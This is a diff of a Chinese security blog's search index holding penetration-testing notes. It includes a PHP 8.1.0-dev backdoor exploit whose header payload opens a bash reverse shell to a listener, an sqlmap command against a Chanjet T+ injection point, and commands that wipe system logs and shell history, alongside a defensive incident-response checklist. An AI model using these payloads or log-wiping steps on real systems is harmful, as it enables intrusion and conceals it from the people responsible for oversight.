+<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁止把Zookeeper直接暴露在公网</span><br><span class="line">2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>服务器漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Php8.1backdoor</title>
+    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/PHP/php8.1.html</url>
+    <content><![CDATA[<h1 id="PHP8-1后门漏洞">1. PHP8.1后门漏洞</h1><h2 id="影响版本">1.1. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 8.1.0-dev</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络测绘">1.2. 网络测绘:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;PHP/8.1.0-dev&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">1.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumvar_dump(3*7);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/17/aLZYTRXxgbM38Im.png" alt="image-20220717173108649"></p>
+<h2 id="漏洞利用">1.4. 漏洞利用:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.179.129/9999 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/17/ivMWj4CTebIhfpn.png" alt="image-20220717174749390"></p>
+]]></content>
+      <categories>
+        <category>高级语言</category>
+        <category>PHP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>应急响应</title>
+    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
+    <content><![CDATA[<h1 id="windows">1. windows</h1><h2 id="查询当前登录系统的会话">1.1. 查询当前登录系统的会话</h2><p><strong>RDP远程连接允许不同的用户同时登录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026125524972.png" alt="image-20221026125524972"></p>
+<h2 id="查看本地用户组">1.2. 查看本地用户组</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lusrmgr.msc</span><br><span class="line"></span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">相比于net user,lusrmgr.msc可以看到隐藏用户，而net user不可以</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026113323192.png" alt="image-20221026113323192"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026113822726.png" alt="image-20221026113822726"></p>
+<h2 id="查看网络连接">1.3. 查看网络连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano	#可用findstr过滤，类似Linux的grep命令</span><br><span class="line"></span><br><span class="line">#打印路由表</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">#查看网络代理配置情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="检查进程">1.4. 检查进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#列出所有进程</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">#强制停止某进程</span><br><span class="line">taskkill /T /F /PID</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026115510214.png" alt="image-20221026115510214"></p>
+<h2 id="检查启动项">1.5. 检查启动项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统开机时间</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">#查看系统计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">[at] &amp; [schtasks]</span><br><span class="line">at &lt; Windows2012</span><br><span class="line">schtasks &gt;= Windows2012</span><br><span class="line">#查看程序启动信息</span><br><span class="line">wmic startup get command,caption</span><br><span class="line">msconfig</span><br><span class="line"></span><br><span class="line">win + R services.msc</span><br><span class="line">#查看主机服务信息</span><br><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026120156617.png" alt="image-20221026120156617"></p>
+<h2 id="检测目录文件">1.6. 检测目录文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%UserProfile%\Recent</span><br></pre></td></tr></table></figure>
+
+<h2 id="检查浏览器访问记录">1.7. 检查浏览器访问记录</h2><h2 id="杀软工具">1.8. 杀软工具</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">卡巴斯基</span><br><span class="line">火绒-火绒剑</span><br></pre></td></tr></table></figure>
+
+<h2 id="系统日志审计">1.9. 系统日志审计</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eventvwr.msc，也可通过右键计算机管理-事件查看器-windows日志-系统</span><br></pre></td></tr></table></figure>
+
+<p><strong>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">事件ID</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">4624</td>
+<td align="left">登录成功</td>
+</tr>
+<tr>
+<td align="left">4625</td>
+<td align="left">登录失败</td>
+</tr>
+<tr>
+<td align="left">4634</td>
+<td align="left">注销成功</td>
+</tr>
+<tr>
+<td align="left">4647</td>
+<td align="left">用户启动的注销</td>
+</tr>
+<tr>
+<td align="left">4672</td>
+<td align="left">使用超级用户（如管理员）进行登录</td>
+</tr>
+<tr>
+<td align="left">4720</td>
+<td align="left">创建用户</td>
+</tr>
+</tbody></table>
+<h1 id="linux">2. linux</h1><h2 id="账户安全">2.1. 账户安全</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line"></span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看历史命令">2.2. 查看历史命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/.bash_history		查看root的历史命令</span><br><span class="line">cat ~/.bash_history 		查看当前用户的历史命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="检查网络连接">2.3. 检查网络连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">#查看 PID 所对应的进程文件路径</span><br><span class="line">file /proc/$PID/exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026132013188.png" alt="image-20221026132013188"></p>
+<h2 id="检查进程-1">2.4. 检查进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top</span><br><span class="line"></span><br><span class="line">ps aux</span><br><span class="line">可用grep进行筛选</span><br><span class="line">ps aux | grep pid</span><br><span class="line"></span><br><span class="line">结束进程</span><br><span class="line">kill -9 PID</span><br></pre></td></tr></table></figure>
+
+<h2 id="检查启动项-1">2.5. 检查启动项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /etc/init.d/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026133536626.png" alt="image-20221026133536626"></p>
+<h2 id="检查定时任务">2.6. 检查定时任务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /var/spool/cron/* </span><br><span class="line">cat /etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line"></span><br><span class="line">#查看目录下所有文件和文件内容</span><br><span class="line">more /etc/cron.d/*</span><br><span class="line"></span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检查系统日志">2.7. 检查系统日志</h2><table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
+<td align="center">记录系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
+<td align="center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
+</tr>
+<tr>
+<td align="center"><code>/var/log/btmp</code></td>
+<td align="center">记录错误登录（登陆失败）日志；使用<strong>lastb</strong>命令查看</td>
+</tr>
+<tr>
+<td align="center"><code>/var/log/lastlog</code></td>
+<td align="center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
+</tr>
+<tr>
+<td align="center"><code>/var/log/wtmp</code></td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
+<td align="center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
+<td align="center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码，使用more命令查看</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询ssh登录记录</span><br><span class="line">more /var/log/secure</span><br><span class="line"></span><br><span class="line">#安装软件的日志-&gt; Centos</span><br><span class="line">/var/log/yum.log</span><br><span class="line">#安装软件的日志-&gt; Ubuntu</span><br><span class="line">/var/log/apt/</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;var&#x2F;log&#x2F;syslog</strong>：只记录警告信息，常常是系统出问题的信息；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syslog是Linux系统默认的日志守护进程</span><br><span class="line"></span><br><span class="line">默认的syslog配置文件是/etc/sysctl.conf文件</span><br><span class="line"></span><br><span class="line">syslog不可以使用vi等工具直接查看，它是二进制文件，使用 lastlog 查看</span><br></pre></td></tr></table></figure>
+
+<p>默认Centos，Fedora不生成该日志文件，但可以配置让系统生成该日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/rsyslog.conf	文件中加上：	*.warning /var/log/syslog</span><br></pre></td></tr></table></figure>
+
+<p>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息</p>
+<h2 id="查找文件">2.8. 查找文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">按时间查找</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line">按文件名查找</span><br><span class="line">find / -name *.jsp -perm 777</span><br><span class="line">#找出 ./ 下一天前访问过的文件</span><br><span class="line">find ./ -iname &quot;*&quot; -atime 1 -type f </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026134323740.png" alt="image-20221026134323740"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>畅捷通</title>
+    <url>/pages/WEB%E5%BA%94%E7%94%A8/%E7%95%85%E6%8D%B7%E9%80%9A.html</url>
+    <content><![CDATA[<h1 id="畅捷通">1. 畅捷通</h1><h2 id="畅捷通前台SQL注入漏洞">1.1. 畅捷通前台SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前台管理员的AccountNum参数存在漏洞</span><br><span class="line">下图处抓包</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/23/JoqrS3HZMEmUA6W.png" alt="image-20220822235322033_1_.png"></p>
+<h2 id="畅捷通未授权访问SQL注入漏洞">1.2. 畅捷通未授权访问SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞点为如下目录的zt参数</span><br><span class="line">/tplus/UFAQD/KeyInfoList.aspx?preload=1&amp;zt=1	</span><br><span class="line">sqlmap运行参数如下:</span><br><span class="line">sqlmap -u &quot;target_url&quot; -p zt --level 5  --tamper=space2comment --random-agent</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220822235130899.png" alt="image-20220822235130899"></p>
+<p><img src="https://s2.loli.net/2022/08/22/lp21JfDZECQw6rq.png" alt="image-20220822234600880"></p>
+]]></content>
+      <categories>
+        <category>WEB应用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小程序渗透</title>
+    <url>/pages/app-%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95.html</url>
+    <content><![CDATA[<h1 id="小程序逆向">1. 小程序逆向</h1><ol>
+<li><p>工具这里采用<a href="https://github.com/r3x5ur/unveilr">unveilr</a>,使用教程看Github，可以使用单独的可执行文件或者用npm下载配置全局变量。</p>
+</li>
+<li><p>用户在点击PC端wx小程序时，会在<code>WeChat Files-Applet</code>文件夹下生成一个小程序的包，然后下面找到<code>__APP__.wxapkg</code>文件，该文件为小程序的加密包，无法直接查看。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416172640749.png" alt="image-20230416172640749"></p>
+</li>
+<li><p>使用unveilr工具进行解密，<code>.\unveilr@2.0.0-beta.1-win-x64.exe wx &#39;D:\WeChat\WeChat Files\Applet\wx2942736f91a303d6\16\__APP__.wxapkg&#39; -o &#39;E:\Permeation\app&amp;小程序\解包测试\&#39;</code>,成功解密。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416173909545.png" alt="image-20230416173909545"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416173918906.png" alt="image-20230416173918906"></p>
+</li>
+<li><p>后续可以通过IDEA或者vscode分析代码中的路由或者敏感信息，貌似IDEA无法正确格式化JS文件，格式化之后依然还是同一行，这里使用vscode的格式化插件prettier进行操作。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416174238047.png" alt="image-20230416174238047"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416174326587.png" alt="image-20230416174326587"></p>
+</li>
+<li><p>安装完毕后，点击进入一个js文件，键盘<code>CTRL+ALT+F</code>,会弹出窗口提示是使用插件的格式化或者是默认的格式化功能，这里选插件的，完成后就会如下图所示，成功换行。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416174501254.png" alt="image-20230416174501254"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>app&amp;小程序</category>
       </categories>
   </entry>
   <entry>
@@ -1217,164 +1404,17 @@
       </categories>
   </entry>
   <entry>
-    <title>Php8.1backdoor</title>
-    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/PHP/php8.1.html</url>
-    <content><![CDATA[<h1 id="PHP8-1后门漏洞">1. PHP8.1后门漏洞</h1><h2 id="影响版本">1.1. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 8.1.0-dev</span><br></pre></td></tr></table></figure>
+    <title>痕迹清除</title>
+    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4.html</url>
+    <content><![CDATA[<p>痕迹清除</p>
+<p>windows</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/mAeIuY1lChFbxoR.png" alt="image-20220804073428642"></p>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &gt; /var/log/syslog  // 清除系统日志</span><br><span class="line"></span><br><span class="line">echo &gt; /var/log/wtmp  // 清除用户登录日志</span><br><span class="line"></span><br><span class="line">history -c  // 清除history痕迹</span><br></pre></td></tr></table></figure>
 
-<h2 id="网络测绘">1.2. 网络测绘:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;PHP/8.1.0-dev&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞复现">1.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumvar_dump(3*7);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/17/aLZYTRXxgbM38Im.png" alt="image-20220717173108649"></p>
-<h2 id="漏洞利用">1.4. 漏洞利用:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.179.129/9999 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/17/ivMWj4CTebIhfpn.png" alt="image-20220717174749390"></p>
-]]></content>
-      <categories>
-        <category>高级语言</category>
-        <category>PHP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>应急响应</title>
-    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
-    <content><![CDATA[<h1 id="windows">1. windows</h1><h2 id="查询当前登录系统的会话">1.1. 查询当前登录系统的会话</h2><p><strong>RDP远程连接允许不同的用户同时登录</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026125524972.png" alt="image-20221026125524972"></p>
-<h2 id="查看本地用户组">1.2. 查看本地用户组</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lusrmgr.msc</span><br><span class="line"></span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">相比于net user,lusrmgr.msc可以看到隐藏用户，而net user不可以</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026113323192.png" alt="image-20221026113323192"></p>
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026113822726.png" alt="image-20221026113822726"></p>
-<h2 id="查看网络连接">1.3. 查看网络连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano	#可用findstr过滤，类似Linux的grep命令</span><br><span class="line"></span><br><span class="line">#打印路由表</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">#查看网络代理配置情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="检查进程">1.4. 检查进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#列出所有进程</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">#强制停止某进程</span><br><span class="line">taskkill /T /F /PID</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026115510214.png" alt="image-20221026115510214"></p>
-<h2 id="检查启动项">1.5. 检查启动项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统开机时间</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">#查看系统计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">[at] &amp; [schtasks]</span><br><span class="line">at &lt; Windows2012</span><br><span class="line">schtasks &gt;= Windows2012</span><br><span class="line">#查看程序启动信息</span><br><span class="line">wmic startup get command,caption</span><br><span class="line">msconfig</span><br><span class="line"></span><br><span class="line">win + R services.msc</span><br><span class="line">#查看主机服务信息</span><br><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026120156617.png" alt="image-20221026120156617"></p>
-<h2 id="检测目录文件">1.6. 检测目录文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%UserProfile%\Recent</span><br></pre></td></tr></table></figure>
-
-<h2 id="检查浏览器访问记录">1.7. 检查浏览器访问记录</h2><h2 id="杀软工具">1.8. 杀软工具</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">卡巴斯基</span><br><span class="line">火绒-火绒剑</span><br></pre></td></tr></table></figure>
-
-<h2 id="系统日志审计">1.9. 系统日志审计</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eventvwr.msc，也可通过右键计算机管理-事件查看器-windows日志-系统</span><br></pre></td></tr></table></figure>
-
-<p><strong>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">事件ID</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">4624</td>
-<td align="left">登录成功</td>
-</tr>
-<tr>
-<td align="left">4625</td>
-<td align="left">登录失败</td>
-</tr>
-<tr>
-<td align="left">4634</td>
-<td align="left">注销成功</td>
-</tr>
-<tr>
-<td align="left">4647</td>
-<td align="left">用户启动的注销</td>
-</tr>
-<tr>
-<td align="left">4672</td>
-<td align="left">使用超级用户（如管理员）进行登录</td>
-</tr>
-<tr>
-<td align="left">4720</td>
-<td align="left">创建用户</td>
-</tr>
-</tbody></table>
-<h1 id="linux">2. linux</h1><h2 id="账户安全">2.1. 账户安全</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line"></span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure>
-
-<h2 id="查看历史命令">2.2. 查看历史命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/.bash_history		查看root的历史命令</span><br><span class="line">cat ~/.bash_history 		查看当前用户的历史命令</span><br></pre></td></tr></table></figure>
-
-<h2 id="检查网络连接">2.3. 检查网络连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">#查看 PID 所对应的进程文件路径</span><br><span class="line">file /proc/$PID/exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026132013188.png" alt="image-20221026132013188"></p>
-<h2 id="检查进程-1">2.4. 检查进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top</span><br><span class="line"></span><br><span class="line">ps aux</span><br><span class="line">可用grep进行筛选</span><br><span class="line">ps aux | grep pid</span><br><span class="line"></span><br><span class="line">结束进程</span><br><span class="line">kill -9 PID</span><br></pre></td></tr></table></figure>
-
-<h2 id="检查启动项-1">2.5. 检查启动项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /etc/init.d/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026133536626.png" alt="image-20221026133536626"></p>
-<h2 id="检查定时任务">2.6. 检查定时任务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /var/spool/cron/* </span><br><span class="line">cat /etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line"></span><br><span class="line">#查看目录下所有文件和文件内容</span><br><span class="line">more /etc/cron.d/*</span><br><span class="line"></span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="检查系统日志">2.7. 检查系统日志</h2><table>
-<thead>
-<tr>
-<th align="center">日志文件</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
-<td align="center">记录系统定时任务相关的日志</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
-<td align="center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
-</tr>
-<tr>
-<td align="center"><code>/var/log/btmp</code></td>
-<td align="center">记录错误登录（登陆失败）日志；使用<strong>lastb</strong>命令查看</td>
-</tr>
-<tr>
-<td align="center"><code>/var/log/lastlog</code></td>
-<td align="center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
-</tr>
-<tr>
-<td align="center"><code>/var/log/wtmp</code></td>
-<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
-<td align="center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
-<td align="center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码，使用more命令查看</td>
-</tr>
-</tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询ssh登录记录</span><br><span class="line">more /var/log/secure</span><br><span class="line"></span><br><span class="line">#安装软件的日志-&gt; Centos</span><br><span class="line">/var/log/yum.log</span><br><span class="line">#安装软件的日志-&gt; Ubuntu</span><br><span class="line">/var/log/apt/</span><br></pre></td></tr></table></figure>
-
-<p><strong>&#x2F;var&#x2F;log&#x2F;syslog</strong>：只记录警告信息，常常是系统出问题的信息；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syslog是Linux系统默认的日志守护进程</span><br><span class="line"></span><br><span class="line">默认的syslog配置文件是/etc/sysctl.conf文件</span><br><span class="line"></span><br><span class="line">syslog不可以使用vi等工具直接查看，它是二进制文件，使用 lastlog 查看</span><br></pre></td></tr></table></figure>
-
-<p>默认Centos，Fedora不生成该日志文件，但可以配置让系统生成该日志文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/rsyslog.conf	文件中加上：	*.warning /var/log/syslog</span><br></pre></td></tr></table></figure>
-
-<p>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息</p>
-<h2 id="查找文件">2.8. 查找文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">按时间查找</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line">按文件名查找</span><br><span class="line">find / -name *.jsp -perm 777</span><br><span class="line">#找出 ./ 下一天前访问过的文件</span><br><span class="line">find ./ -iname &quot;*&quot; -atime 1 -type f </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026134323740.png" alt="image-20221026134323740"></p>
 ]]></content>
       <categories>
         <category>内网渗透</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>畅捷通</title>
-    <url>/pages/WEB%E5%BA%94%E7%94%A8/%E7%95%85%E6%8D%B7%E9%80%9A.html</url>
